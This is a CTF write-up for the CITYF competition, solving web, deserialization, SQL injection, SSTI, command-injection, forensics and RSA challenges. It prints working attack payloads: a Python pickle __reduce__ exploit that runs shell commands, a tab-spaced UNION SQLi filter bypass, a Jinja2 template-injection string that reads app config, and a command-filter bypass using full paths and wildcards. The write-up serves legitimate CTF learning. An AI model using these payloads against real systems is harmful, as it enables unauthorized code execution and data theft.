# CITYF challenges writeup

[//]: ![](https://i.imgur.com/DswOhs9.png)

## Babysite1
http://cityf01.cs.cityu.edu.hk:30002/main.html
Site for the babysite1
### View source of the page

```html
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>The World's Worst Website Ever!</title>
<meta name="author" content="THIS CODE IS SUPPOSED TO BE ATROCIOUS. However, it's 100% safe to visit TWWWE.  The site may be awful, but it ain't dangerous.">
<meta name="description" content="Welcome to the World's Worst Website Ever!">
<style>
        .menuitemz {color: white; font-size: 48px; font-family: Comic Sans MS, Comic Sans, arial; }
        .menuitemz a {color: hotpink; font-size: 48px;}
        </style>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-46911809-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-46911809-1');
</script>
        </head>
<body style="background-image: url('img21/newbkg.jpg')">
        <div style="color: white;"><strong>Hello 2021!!!!</strong>  It's finally <strong>here!!!</strong>  The new & IMPROVED......</div>
        <div style="width: 1400px">
                <img src="img21/logo.gif" width="1300px">
                <!-- _b3aut1ful} -->>
<h1 style="font-family: 'Brush Script MT', Brush Script, Times, Time New Roman, serif; font-size: 325%;"><i>The World's <span style="text-decoration: line-through;">Worst</span> <span style="color: white">BEST</span> Website Ever! - (TWWWE)</i></h1>
          <table style="width: 3600px; background-color: purple;">
                        <tr>
                                <td class="menuitemz"><strong><em>MAIN MENU ---&gt;</em></strong></td>
                                <td class="menuitemz"><a href="tipz.php">*Internet Promotions Tipz &amp; Real TRUTHFUL Facts</a></td>
                                <td class="menuitemz">*<a href="colors.htm">Amazing Colors</a></td>
                                <td class="menuitemz">*P<a href="fonts.htm">HAB FONTS</a></td>
                                <td class="menuitemz">*<a href="software.htm">Our FAV SoFtWaRe!</a></td>
                                <td class="menuitemz">*<a href="trumpglish.htm">TRUMPglish</a></td>
                </tr>
          </table>
<p><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:inline-block;width:728px;height:90px"
     data-ad-client="ca-pub-1190779243209714"
     data-ad-slot="9721947463"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script></p>
                <div><img src="img21/black-bar.gif"><img src="img21/black-bar.gif"><img src="img21/black-bar.gif"><img src="img21/black-bar.gif"></div>
                <table><tr><td style="font-size: 85px; font-weight: bold; color: red">WELCOME WELCOME WELCOME!/h2&gt;</td></tr></table>
<div><img src="img21/black-bar.gif"><img src="img21/black-bar.gif"><img src="img21/black-bar.gif"><img src="img21/black-bar.gif"></div>
                <div style="position: absolute; top: 327px; left: 1447px; width: 1562px; height: 574px;">
                        <img src="img21/maga.png" alt="MAGA" style="width: 100%;">
                </div>
                <div style="background-color: white; width: 1400px; font-size: 24px;">
                                <div style="float: right;">
                <a class="twitter-timeline" href="https://twitter.com/worldsworstweb?ref_src=twsrc%5Etfw">Tweets by worldsworstweb</a> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
                </div>                          <p>
                        OMG!  This is SOOOOO huge people!  We are super pumped to launch the BRAND NEW TWWWE - The World's BEST Website Ever!  Our goal is bring you the absolute goodly in really not-awful web sight design!  We are setting out to NOT BREAK every single design rule imaginable!  HOWEVER - BIG DISCLAIMER - we can't bring back ALL the awesome design stuff from the mid 90s - stuff that's FOR BREAUTIFUL GREAT DESIGN - because we have to basic, fundamental stuff right in order for this interweb to WORK CORRECTLY.  Know what I mean?  We REALLY want to bring back to OLD SCHOOL JAVASCRIPT CURSORS (they're the BEST) but we can't because browsers won't let us do it.  And stuff like that.  
                        But - we can promise you this. OUR SIGHT IS 100% SAFE and VIRUS FREE.  We aren't animals.  We're just llamas. <img src="img21/llama.jpg" width="282" height="246" alt=""/> <span style="font-size: 50%">(we got this pic from Wikipedia - <a href="https://commons.wikimedia.org/wiki/File:Lama,_Chinchero.jpg" target="_blank">here is a link</a> to the license so we don't get yelled at )</span></p>
                        <p>Hard hats required! This site is...
                        <img src="img21/2_workers.gif" style="">
                        </p>

                <div style="clear: both">
                </div>
                <p><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:inline-block;width:728px;height:90px"
     data-ad-client="ca-pub-1190779243209714"
     data-ad-slot="9721947463"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script></p>
                </div>

        </div>
        <div>
                <h2><img src="img21/arrow-new.gif" width="45" height="37" alt=""/>We are now on social media!</h2>
                <p style="background-color: red; color: white; font-size: 200%;">Follow us on TWITTER for the absolute <em style="font-family: Brush Script, Brush Script MT, sans">&quot;best&quot;</em> DESIGN and INTERNET PROMOTIONS TIPZ you can get anywhere. <a href="https://www.twitter.com/worldsworstweb" target="_blank">@worldsworstweb</a></p>

</div>
<table style="width: 5000px;">
                <tr>
                        <td style="background-color: lime; color: red; font-family: Comic Sans MS, Comic Sans, arial; font-size: 200%;">
                                <h2>ITS THE MARQUEE RACE!!!</h2>
                                <p>Who's gonna win???</p>
<marquee scrollamount="15" direction="right">I'm fast!</marquee><br>
<marquee scrollamount="16" direction="right">I'm faster!</marquee><br>
<marquee scrollamount="17" direction="right">I'm fastest!</marquee><br>
<marquee scrollamount="25" direction="right">I'm fastestest!!</marquee><br>
<marquee scrollamount="40" direction="right">COVFEFE!!!! CITYF{1s_th3_Sit3 </marquee>
                        </td>
                </tr>
</table>
        <table style="width: 1800px; margin: 50px;">
                <tr>
                        <td style="">
        <img src="img21/arrltan_e0.gif" width="1600" height="40" alt="">
                  </td>
                </tr>
        </table>
<table style="width: 3900px;">
                <tr>
                        <td style="color: white; text-shadow: 2px 2px #000; font-size: 200%;">
                        <h2 style="font-family: Brush Script MT, Brush Script, Times, Time New Roman, serif">Traffic Stats</h2>
                                <p>TWWWE has been online since 2008 and we've gotten thousands of visitors!!!</p>
                                <p>DAILY RECORD<br>
                                <img src="img21/1.gif"><img src="img21/5.gif"><img src="img21/7.gif"><img src="img21/3.gif"><img src="img21/1.gif"></p>
                                <p>MONTHLY RECORD<br>
                                <img src="img21/4.gif"><img src="img21/8.gif"><img src="img21/8.gif"><img src="img21/0.gif"><img src="img21/2.gif"></p>
                                <p>TOTAL SINCE 2008 <a href="http://www.easycounter.com/">
<img src="http://www.easycounter.com/counter.php?shawn42"
border="0" alt="HTML Hit Counter"></a>
</p>
                </td>
                        <td style="background-color: black">
                                <img src="img21/shimmering-multistars.gif"><img src="img21/shimmering-multistars.gif"><img src="img21/shimmering-multistars.gif"><img src="img21/shimmering-multistars.gif"><img src="img21/shimmering-multistars.gif"><img src="img21/shimmering-multistars.gif"><img src="img21/shimmering-multistars.gif"><img src="img21/shimmering-multistars.gif">


                                                <h2 style="color: blue; text-shadow: 3px 3px #000; font-size: 250%; font-family: Brush Script MT, Brush Script, Times, Time New Roman, serif">VIDEO OF THE WEEK</h2>
<iframe width="560" height="315" src="https://www.youtube.com/embed/9bZkp7q19f0" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
<img src="img21/shimmering-multistars.gif"><img src="img21/shimmering-multistars.gif"><img src="img21/shimmering-multistars.gif"><img src="img21/shimmering-multistars.gif"><img src="img21/shimmering-multistars.gif"><img src="img21/shimmering-multistars.gif"><img src="img21/shimmering-multistars.gif"><img src="img21/shimmering-multistars.gif">
                  </td>
                  <td style="background-color: #fff">   <img src="img21/con-1.gif"><br>                                   <h2 style="color: blue; text-shadow: 1px 1px #000; font-size: 250%; background-color: #fff; font-family: Brush Script MT, Brush Script, Times, Time New Roman, serif">---&gt;&gt;&gt; TWWWE Poll &lt;&lt;&lt;---</h2>
                          <p style="font-size: 200%; color: red;">Do you think this is really a  beautifully designed website?</p>
                          <p><img src="img21/terrible-poll.jpg" width="600" height="600" alt=""/></p>
</td>
                  <td><h2 style="color: blue; text-shadow: 1px 1px #000; font-size: 250%; background-color: #fff; font-family: Brush Script MT, Brush Script, Times, Time New Roman, serif"><img src="img21/new21.gif"> <img src="img21/new21.gif">COMING SOON <img src="img21/new21.gif"> <img src="img21/new21.gif"></h2>
                        <p style="background-color: white;">Probably nothing really.  But I might change my mind.  Who Knows? Here's a picture of a hot dog.</p>
                        <img src="img21/hot-dog.png" width="2362" height="1051" alt=""/></td>
                        <td style="border: 5px solid pink; background-color: aqua; color: purple">This box has nothing to do with anything.  So you don't have to read it.  Thank you!</td>
                </tr>
</table>
        <div>
          <p style="font-size: 500%; color: white; text-shadow: 5px 5px gray;font-family: Brush Script MT, Brush Script, Times, Time New Roman, serif">Please hit the play button for the full effect of enjoying TWWWE!
          <audio controls>
  <source src="img21/heyya.mp3" type="audio/mpeg">
Your browser does not support the audio element.
</audio></p></div>
        <table style="border: 20px solid pink; width: 7000px;">
                <tr>
                  <td valign="top" style="border: 20px solid pink; background-color: aqua; width: 300px;"><h2 style="font-family: Comic Sans MS, Comic Sans, Times, Times New Roman, serif">The 9 ABSOLUTE BEST WEBSITES on the WHOLE WWW</h2>
                          <ol>
                                  <li>There</li>
                                  <li>are</li>
                                  <li>no</li>
                                  <li>other</li>
                                  <li>truly</li>
                                  <li>beautiful</li>
                                  <li>sites</li>
                                  <li>except</li>
                                  <li><a href="old.htm">the original TWWWE</a></li>
                          </ol>
                        </td>
                        <td valign="top" style="border: 20px solid pink; background-color: aqua; width: 300px;"><h2 style="font-family: Comic Sans MS, Comic Sans, Times, Times New Roman, serif">TWWWE Privacy &amp; Terms of Service &amp; Facebook Is The Matrix</h2>
                                <ul style="font-family: Comic Sans MS, Comic Sans, Times, Times New Roman, serif">
                                        <li>We don't track you nor do we collect personal information and we don't use cookies... although we do eat them...</li>
                                        <li>We do have Google services on the site.  You're probably subject to their terms and privacy, whatever they are...</li>
                                        <li>TWWWE isn't liable for people being stupid on the internet...</li>
                                        <li>We aren't responsible for links from this site...</li>
                                        <li>...not that any of this matters, if you have a Facebook account. Facebook is everywhere. It is all around us. Even now, in this very room. You can see it when you look out your window or when you turn on your television. You can feel it when you go to work... when you go to church... when you pay your taxes. Facebook is the world that has been pulled over your eyes to blind you from the truth.</li>
                                </ul>
                        </td>
                        <td align="top" style="border: 20px solid pink; background-color: aqua;"><h2>The WORLDS LARGEST FONT</h2>
                                <span style="font-size: 1600px; line-height: 1000px;">PICKLE</span>
                        </td>
                </tr>
        </table>
<div style="background-color: navy; color: white">
        Introducing... the internet's LONGEST NUMBER on a webpage!!!<br/>
654068706516540465461768764187641245763487861387303857025706837618094876030307306868570940950006062026860763574246507364703644065480644586718736450733450745076478051680536186567840849058057780580564956567408403073470655678654054609750057548066570806607486940567814507316066351065568746069546084979660176010631062060163056130103123163206445757347468466475609670804664806506480546470364060640630164056436440546640435564067056789465754750641356105734642606267160450316016566764booger4165406870651654046546176876418764124576348786138730385702570683761809487603030730686857094095000606202686076357424650736470364406548064458671873645073345074507647805168053618656784084905805778058056495655754750641356105734642606267160450316016566764416540687065165404654617687641876412457634878613873038570257068376180948760303073068685709409500060620268607635742465073647036440654806445867187364507334507450764780516805361865678408490580577805805649565
</div>
<div style="background-color: green; width: 3000px; padding: 50px; margin: 50px;">
        <img src="img21/old.jpg" width="829" height="645" alt="old" style="float: left; padding-right: 20px;">
        <h3 style="font-size: 400%;"><img src="img21/lol.gif" width="286" height="200" alt=""/> Time to LOL! YOUR MOM <em>JOKE OF THE CENTURY</em></h3>
        <p style="font-size: 200%;">Your mom's so old that her social security number is<br>
  <span style="color: white; font-size: 1200%;">1</span></p>
</div>
<div style="background-color: #fff; width: 1000px; font-size: 70%; font-family: Arial">

This sight was best viewed through <img src="img21/ie7.jpg"> Internet Explorer but they got rid of that, so probably <img src="img21/firefox-3.jpg"> Firefox.  View through at least a 1024x768 resolution - definately not with a smartphone.  lol.  Macs are still stupid and so is Safari so this sight prolly won't look right through Safari or an Apple.  We feel sorry for you Apple worshippers :(
        <br><br>
        &copy; 2008-2021 TWWWE.  All Rights Reserved.  So there!  Contact ----&gt; donot.email.us@twwwe.com
        <p><a href="what.htm">What?</a></p>
</div>
</body>
</html>
```

---
### Then find the flag by searching for "CITYF{"
First half of the flag is  this: `CITYF{1s_th3_Sit3`

this means theres another half, so search for `}`


Seeing the `_b3aut1ful}`

Combine to get the flag:`CITYF{1s_th3_Sit3_b3aut1ful}`

## Babysite2
robots.txt
```
curl http://cityf01.cs.cityu.edu.hk:30002/robots.txt
file_not_visible/flag.txt

curl http://cityf01.cs.cityu.edu.hk:30002/file_not_visible/flag.txt
CITYF{s1t3_is_NOT_v1s1ble_t0_R0b0t}

```
Flag : `CITYF{s1t3_is_NOT_v1s1ble_t0_R0b0t}`

## Babysite3
In the cookie

```
curl -i http://cityf01.cs.cityu.edu.hk:30002/
HTTP/1.1 200 OK
X-Powered-By: Express
Set-Cookie: flag=Q0lUWUZ7YzAwa2kzX0lzX2Z1bl8xMjM0NTZ9; Path=/
Content-Type: text/html; charset=utf-8
Content-Length: 198
ETag: W/"c6-h0bZNYkBakgLDh2QIHSqEyxQhcg"
Date: Sat, 23 Oct 2021 18:14:20 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<!DOCTYPE html><html><head><title>BabyEcho</title><link rel="stylesheet" href="/stylesheets/style.css"></head><body><p>Welcome to BabyEcho</p><a href="./main.html">here is the link</a></body></html>
```
Base64 decode the flag 
```
echo "Q0lUWUZ7YzAwa2kzX0lzX2Z1bl8xMjM0NTZ9" | base64 -d
CITYF{c00ki3_Is_fun_123456}
```
Flag : `CITYF{c00ki3_Is_fun_123456}`


## Deserialization
Python pickle insecure deserialization

So just use this to serialize malicious data to the payload 
```python
import os
import pickle
import base64

class Exploit(object):
    def __reduce__(self):
        return (eval, ("[os.popen('cat flag.txt').read(),'anything_is_fine']",))

print(base64.b64encode(pickle.dumps(Exploit())))
```
Base64 encoded data generated : 
```
gASVZwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxLW29zLnBvcGVuKCdjYXQgZmxhZy50eHQgOyB0b3VjaCAvdG1wL3NoaXR0eV9mICcpLnJlYWQoKSwnYW55dGhpbmdfaXNfZmluZSddlIWUUpQu
```
Then just set in the `contents` cookie

When page load, it will deserialize the data and the flag can be seen 

![](https://i.imgur.com/lFDGklE.jpg)

Flag : `CITYF{pIckl3_is_uns4fe}`


## Babysql
SQL injection with filters

This challenge basically is a replica of a SQLi challenge in another CTF, by using similar payloads the flag can be extracted from database

https://noob3xploiter.medium.com/lit-ctf-alex-fan-club-sql-injection-with-strict-blacklist-7abbcd402751

The challenge has a filter, which will filter out common characters in SQLi payloads, however it can be bypassed, by reading the writeup, we can easily "learn" how to bypass it (e.g. replace space to tab...) 

After finding the table name and its column name, the flag can be extracted : 

```sql
anything'	UNION	SELECT	redacted	from	redacted	WHERE	redacted	like'
```
![](https://i.imgur.com/8a2s6zT.png)


`flag{redacted}` this flag is invalid

Since this challenge is copied from another CTF, I think the organizer is too lazy to even change the flag format to CITYF{}

I changed the flag format, and its correct

Flag : `CITYF{redacted}`




## Masterecho
This one about SSTI in jinja2 with filters

This challenge is also a replica of another CTF :;
https://ctftime.org/writeup/10895

It has filter to filter out common characters used in a SSTI (Server Side Template Injection)

But just reading that writeup, we can easily "learn" how to bypass those filter ...

Using similar payload, can get the flag :

```python
{{get_flashed_messages.__globals__['current_app'].config['flag']}}
```
Flag : `CITYF{SsTi_4nd_w@f_t0gether}`

## Cmd
cmd.c
```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
    int r=0;
    r += strstr(cmd, "flag")!=0;
    r += strstr(cmd, "sh")!=0;
    r += strstr(cmd, "tmp")!=0;
    r += strstr(cmd, "cat")!=0;
    return r;
}
int main(int argc){
    putenv("PATH=/nopathenv");
    char input[30];
    gets(input);
    if (strlen(input)>=30) return 0;
    if(filter(input)) return 0;
    system( input);
    return 0;
}
```
`putenv("PATH=/nopathenv");` this line is changing the PATH environment variable to `/nopathenv`

However, using full path of the binary can bypass this

```
nc cityf01.cs.cityu.edu.hk 30010
/bin/ls
???\
cmd
flag
nohup.out
test
```

`cat` and `flag` is filtered, however using `head` and wildcard can bypass the filter

```
nc cityf01.cs.cityu.edu.hk 30010
/usr/bin/head fla*
CITIF{tH14_ls_fl4g}
```
Flag : `CITIF{tH14_ls_fl4g}`

## Hidden flag
Just run strings over the binary can see the flag
```
strings rev_00 | grep CITYF
CITYF{st31ngs_1s_4asy}
```
Flag : `CITYF{st31ngs_1s_4asy}`




## Sea_and_sky
Analyse the file with binwalk 
```
binwalk badweather.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 800 x 467, 8-bit/color RGB, non-interlaced
179           0xB3            Zlib compressed data, best compression
326394        0x4FAFA         Zip archive data, at least v2.0 to extract, compressed size: 11275, uncompressed size: 14705, name: flag.png
337797        0x52785         End of Zip archive, footer length: 22
```
`flag.png` is inside so it can be extracted using binwalk
```
binwalk --extract --dd=".*" badweather.png
```
Flag : `CITYF{H1dden_Ln_pn9_z1p}`
![](https://i.imgur.com/dHQZP49.png)

---

## Welcome

Straightly click it open and copy the flag then submit it

Flag : `CITYF{welcome_to_CITYF}`

## Rsa_improved

output.txt
```
n = 10588750243470683238253385410274703579658358849388292003988652883382013203466393057371661939626562904071765474423122767301289214711332944602077015274586262780328721640431549232327069314664449442016399
e = 65537
ct = 2093679529573280822046118784413700108333955356566436078249435745673869110116883084133929754933311199736732547505892559695135678800481469602859356500165748152612256935469597540381698322759986797887837
```

Factor of n can be found on : http://factordb.com/index.php?query=10588750243470683238253385410274703579658358849388292003988652883382013203466393057371661939626562904071765474423122767301289214711332944602077015274586262780328721640431549232327069314664449442016399

The factordb library for python can be installed using pip
```
pip install factordb-python
```
And here's the code to solve it:
```python
n = 10588750243470683238253385410274703579658358849388292003988652883382013203466393057371661939626562904071765474423122767301289214711332944602077015274586262780328721640431549232327069314664449442016399
e = 65537
ct = 2093679529573280822046118784413700108333955356566436078249435745673869110116883084133929754933311199736732547505892559695135678800481469602859356500165748152612256935469597540381698322759986797887837

from factordb.factordb import FactorDB as fb
from functools import reduce
import binascii

f = fb(n)
f.connect()
prime_factors = f.get_factor_list()
phi = reduce(lambda a, b: a * b, map(lambda u: u - 1, prime_factors))
d = pow(e, -1, phi)
print(binascii.unhexlify(hex(pow(ct, d, n))[2:]).decode().strip())
```

Flag : `CITYF{RSA_1s_IMprov3d_t0_Mu1ti_v3rsi0n}`
